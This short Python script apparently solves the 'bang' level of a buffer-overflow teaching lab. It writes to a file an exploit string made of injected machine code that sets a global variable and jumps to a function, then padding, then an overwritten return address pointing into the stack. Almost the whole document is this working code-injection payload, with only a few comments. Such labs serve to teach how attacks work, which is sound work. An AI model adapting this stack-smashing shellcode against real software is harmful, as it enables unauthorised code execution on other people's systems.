from struct import *

buf = ""
#buf += "dd 8c 04 08 " #return address for bang: little endian
buf += "c7 05 00 d2 04 08 06 de 2b 49 68 dd 8c 04 08 c3 "
buf += ("31" + " ")*56
# the address of the exploit string
buf += "7c 33 68 55"
f = open("exploit_bang.txt", "w") #sets up to write to file
f.write(buf) #writes to file

